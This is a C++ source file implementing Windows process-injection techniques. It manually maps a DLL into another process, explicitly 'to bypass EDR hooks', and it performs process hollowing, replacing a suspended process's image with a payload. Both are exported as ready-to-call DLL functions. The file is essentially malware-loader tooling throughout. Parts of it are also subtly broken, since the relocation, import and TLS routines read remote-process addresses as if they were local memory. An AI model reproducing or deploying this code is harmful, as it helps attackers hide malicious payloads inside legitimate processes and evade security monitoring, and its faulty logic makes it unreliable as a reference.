#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <string>

#pragma comment(lib, "ntdll.lib")

// Undocumented structures and functions
typedef NTSTATUS(NTAPI* pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

typedef struct _MANUAL_DLL_INJECTION {
    HMODULE hModule;
    LPVOID lpBase;
    DWORD dwSize;
    BOOL bMapped;
} MANUAL_DLL_INJECTION, *PMANUAL_DLL_INJECTION;

class ManualDLLMapper {
private:
    pNtCreateSection NtCreateSection;
    pNtMapViewOfSection NtMapViewOfSection;
    
public:
    ManualDLLMapper() {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
        NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    }
    
    // Manual DLL mapping to bypass EDR hooks
    BOOL ManualMapDLL(HANDLE hProcess, LPVOID pDLLData, DWORD dwDLLSize) {
        IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pDLLData;
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            return FALSE;
        }
        
        IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)((BYTE*)pDLLData + pDosHeader->e_lfanew);
        if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
            return FALSE;
        }
        
        // Allocate memory in target process
        LPVOID pTargetBase = VirtualAllocEx(
            hProcess,
            NULL,
            pNtHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        
        if (!pTargetBase) {
            return FALSE;
        }
        
        // Copy PE headers
        if (!WriteProcessMemory(hProcess, pTargetBase, pDLLData, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
            VirtualFreeEx(hProcess, pTargetBase, 0, MEM_RELEASE);
            return FALSE;
        }
        
        // Copy sections
        IMAGE_SECTION_HEADER* pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            if (pSectionHeader[i].SizeOfRawData > 0) {
                LPVOID pSectionDest = (BYTE*)pTargetBase + pSectionHeader[i].VirtualAddress;
                LPVOID pSectionSrc = (BYTE*)pDLLData + pSectionHeader[i].PointerToRawData;
                
                if (!WriteProcessMemory(hProcess, pSectionDest, pSectionSrc, pSectionHeader[i].SizeOfRawData, NULL)) {
                    VirtualFreeEx(hProcess, pTargetBase, 0, MEM_RELEASE);
                    return FALSE;
                }
            }
        }
        
        // Process relocations
        if (!ProcessRelocations(hProcess, pTargetBase, pNtHeaders, (DWORD_PTR)pTargetBase - pNtHeaders->OptionalHeader.ImageBase)) {
            VirtualFreeEx(hProcess, pTargetBase, 0, MEM_RELEASE);
            return FALSE;
        }
        
        // Resolve imports
        if (!ResolveImports(hProcess, pTargetBase, pNtHeaders)) {
            VirtualFreeEx(hProcess, pTargetBase, 0, MEM_RELEASE);
            return FALSE;
        }
        
        // Execute TLS callbacks
        ExecuteTLSCallbacks(hProcess, pTargetBase, pNtHeaders);
        
        // Call DllMain
        LPVOID pDllMain = (BYTE*)pTargetBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
        
        // Create remote thread to execute DllMain
        HANDLE hThread = CreateRemoteThread(
            hProcess,
            NULL,
            0,
            (LPTHREAD_START_ROUTINE)pDllMain,
            pTargetBase,  // DLL base as parameter
            0,
            NULL
        );
        
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
        
        return TRUE;
    }
    
    // Process relocations for manual mapping
    BOOL ProcessRelocations(HANDLE hProcess, LPVOID pTargetBase, IMAGE_NT_HEADERS* pNtHeaders, DWORD_PTR dwDelta) {
        if (dwDelta == 0) return TRUE;
        
        IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size == 0) return TRUE;
        
        IMAGE_BASE_RELOCATION* pRelocData = (IMAGE_BASE_RELOCATION*)((BYTE*)pTargetBase + relocDir.VirtualAddress);
        
        while (pRelocData->VirtualAddress != 0) {
            DWORD relocCount = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* pRelocItem = (WORD*)((BYTE*)pRelocData + sizeof(IMAGE_BASE_RELOCATION));
            
            for (DWORD i = 0; i < relocCount; i++) {
                WORD type = pRelocItem[i] >> 12;
                WORD offset = pRelocItem[i] & 0x0FFF;
                
                if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
                    DWORD_PTR* pAddress = (DWORD_PTR*)((BYTE*)pTargetBase + pRelocData->VirtualAddress + offset);
                    DWORD_PTR originalValue;
                    
                    // Read original value from target process
                    if (!ReadProcessMemory(hProcess, pAddress, &originalValue, sizeof(DWORD_PTR), NULL)) {
                        return FALSE;
                    }
                    
                    // Apply relocation
                    DWORD_PTR newValue = originalValue + dwDelta;
                    
                    // Write back to target process
                    if (!WriteProcessMemory(hProcess, pAddress, &newValue, sizeof(DWORD_PTR), NULL)) {
                        return FALSE;
                    }
                }
            }
            
            pRelocData = (IMAGE_BASE_RELOCATION*)((BYTE*)pRelocData + pRelocData->SizeOfBlock);
        }
        
        return TRUE;
    }
    
    // Resolve imports for manually mapped DLL
    BOOL ResolveImports(HANDLE hProcess, LPVOID pTargetBase, IMAGE_NT_HEADERS* pNtHeaders) {
        IMAGE_DATA_DIRECTORY importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (importDir.Size == 0) return TRUE;
        
        IMAGE_IMPORT_DESCRIPTOR* pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)pTargetBase + importDir.VirtualAddress);
        
        while (pImportDesc->Name != 0) {
            char* pModuleName = (char*)((BYTE*)pTargetBase + pImportDesc->Name);
            HMODULE hModule = LoadLibraryA(pModuleName);
            
            if (!hModule) {
                return FALSE;
            }
            
            IMAGE_THUNK_DATA* pOriginalFirstThunk = NULL;
            IMAGE_THUNK_DATA* pFirstThunk = NULL;
            
            if (pImportDesc->OriginalFirstThunk) {
                pOriginalFirstThunk = (IMAGE_THUNK_DATA*)((BYTE*)pTargetBase + pImportDesc->OriginalFirstThunk);
            }
            
            pFirstThunk = (IMAGE_THUNK_DATA*)((BYTE*)pTargetBase + pImportDesc->FirstThunk);
            
            while (pFirstThunk->u1.AddressOfData != 0) {
                FARPROC pFunctionAddress = NULL;
                
                if (pOriginalFirstThunk && IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal)) {
                    // Import by ordinal
                    pFunctionAddress = GetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal));
                } else {
                    // Import by name
                    IMAGE_IMPORT_BY_NAME* pImportByName = (IMAGE_IMPORT_BY_NAME*)((BYTE*)pTargetBase + pFirstThunk->u1.AddressOfData);
                    pFunctionAddress = GetProcAddress(hModule, pImportByName->Name);
                }
                
                if (!pFunctionAddress) {
                    return FALSE;
                }
                
                // Write function address to IAT in target process
                if (!WriteProcessMemory(hProcess, &pFirstThunk->u1.Function, &pFunctionAddress, sizeof(FARPROC), NULL)) {
                    return FALSE;
                }
                
                if (pOriginalFirstThunk) {
                    pOriginalFirstThunk++;
                }
                pFirstThunk++;
            }
            
            pImportDesc++;
        }
        
        return TRUE;
    }
    
    // Execute TLS callbacks
    void ExecuteTLSCallbacks(HANDLE hProcess, LPVOID pTargetBase, IMAGE_NT_HEADERS* pNtHeaders) {
        IMAGE_DATA_DIRECTORY tlsDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
        if (tlsDir.Size == 0) return;
        
        IMAGE_TLS_DIRECTORY* pTlsDir = (IMAGE_TLS_DIRECTORY*)((BYTE*)pTargetBase + tlsDir.VirtualAddress);
        PIMAGE_TLS_CALLBACK* pCallback = (PIMAGE_TLS_CALLBACK*)pTlsDir->AddressOfCallBacks;
        
        if (pCallback) {
            while (*pCallback) {
                HANDLE hThread = CreateRemoteThread(
                    hProcess,
                    NULL,
                    0,
                    (LPTHREAD_START_ROUTINE)*pCallback,
                    pTargetBase,
                    0,
                    NULL
                );
                
                if (hThread) {
                    WaitForSingleObject(hThread, 5000);  // 5 second timeout
                    CloseHandle(hThread);
                }
                
                pCallback++;
            }
        }
    }
    
    // Advanced injection using manual mapping
    BOOL InjectDLLAdvanced(DWORD dwProcessId, const wchar_t* dllPath) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
        if (!hProcess) {
            return FALSE;
        }
        
        // Read DLL file
        HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            CloseHandle(hProcess);
            return FALSE;
        }
        
        DWORD dwFileSize = GetFileSize(hFile, NULL);
        std::vector<BYTE> dllBuffer(dwFileSize);
        
        DWORD dwBytesRead;
        if (!ReadFile(hFile, dllBuffer.data(), dwFileSize, &dwBytesRead, NULL)) {
            CloseHandle(hFile);
            CloseHandle(hProcess);
            return FALSE;
        }
        CloseHandle(hFile);
        
        // Perform manual mapping
        BOOL result = ManualMapDLL(hProcess, dllBuffer.data(), dwFileSize);
        
        CloseHandle(hProcess);
        return result;
    }
    
    // Process hollowing technique
    BOOL ProcessHollowing(const wchar_t* targetPath, const wchar_t* payloadPath) {
        STARTUPINFOW si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);
        
        // Create target process in suspended state
        if (!CreateProcessW(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            return FALSE;
        }
        
        // Read payload
        HANDLE hPayloadFile = CreateFileW(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hPayloadFile == INVALID_HANDLE_VALUE) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }
        
        DWORD payloadSize = GetFileSize(hPayloadFile, NULL);
        std::vector<BYTE> payloadBuffer(payloadSize);
        
        DWORD bytesRead;
        ReadFile(hPayloadFile, payloadBuffer.data(), payloadSize, &bytesRead, NULL);
        CloseHandle(hPayloadFile);
        
        // Get target process context
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        
        // Get PEB address
        DWORD_PTR pebAddr = ctx.Rdx;  // RDX contains PEB address in x64
        DWORD_PTR imageBaseAddr = 0;
        
        // Read image base from PEB
        ReadProcessMemory(pi.hProcess, (LPVOID)(pebAddr + 0x10), &imageBaseAddr, sizeof(DWORD_PTR), NULL);
        
        // Unmap original image
        typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
        pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
        NtUnmapViewOfSection(pi.hProcess, (PVOID)imageBaseAddr);
        
        // Parse payload PE headers
        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)payloadBuffer.data();
        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(payloadBuffer.data() + dosHeader->e_lfanew);
        
        // Allocate memory for payload
        LPVOID newImageBase = VirtualAllocEx(
            pi.hProcess,
            (LPVOID)ntHeaders->OptionalHeader.ImageBase,
            ntHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        
        if (!newImageBase) {
            // Try allocating at different address
            newImageBase = VirtualAllocEx(
                pi.hProcess,
                NULL,
                ntHeaders->OptionalHeader.SizeOfImage,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            );
        }
        
        if (!newImageBase) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }
        
        // Copy headers
        WriteProcessMemory(pi.hProcess, newImageBase, payloadBuffer.data(), ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
        
        // Copy sections
        IMAGE_SECTION_HEADER* sectionHeaders = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            LPVOID sectionDest = (BYTE*)newImageBase + sectionHeaders[i].VirtualAddress;
            WriteProcessMemory(pi.hProcess, sectionDest, 
                payloadBuffer.data() + sectionHeaders[i].PointerToRawData, 
                sectionHeaders[i].SizeOfRawData, NULL);
        }
        
        // Update PEB with new image base
        WriteProcessMemory(pi.hProcess, (LPVOID)(pebAddr + 0x10), &newImageBase, sizeof(DWORD_PTR), NULL);
        
        // Update context with new entry point
        ctx.Rcx = (DWORD_PTR)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(pi.hThread, &ctx);
        
        // Resume execution
        ResumeThread(pi.hThread);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        return TRUE;
    }
};

// Export functions for use
extern "C" {
    __declspec(dllexport) BOOL InjectDLLManual(DWORD processId, const wchar_t* dllPath) {
        ManualDLLMapper mapper;
        return mapper.InjectDLLAdvanced(processId, dllPath);
    }
    
    __declspec(dllexport) BOOL HollowProcess(const wchar_t* targetPath, const wchar_t* payloadPath) {
        ManualDLLMapper mapper;
        return mapper.ProcessHollowing(targetPath, payloadPath);
    }
}